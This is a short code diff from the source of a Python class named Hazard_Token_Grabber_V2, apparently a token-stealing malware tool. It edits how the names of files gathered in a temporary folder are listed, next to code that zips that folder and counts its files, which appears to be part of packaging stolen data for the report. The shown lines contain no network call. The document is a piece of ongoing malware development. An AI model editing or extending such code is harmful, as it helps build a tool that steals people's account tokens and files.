@@ -211,7 +211,7 @@ class Hazard_Token_Grabber_V2:
         self.zip(temp, new)
         for dirname, _, files in os.walk(self.tempfolder):
             for f in files:
-                self.files += f"\n・{f}"
+                self.files += f"\n*{f}"
         n = 0
         for r, d, files in os.walk(self.tempfolder):
             n+= len(files)
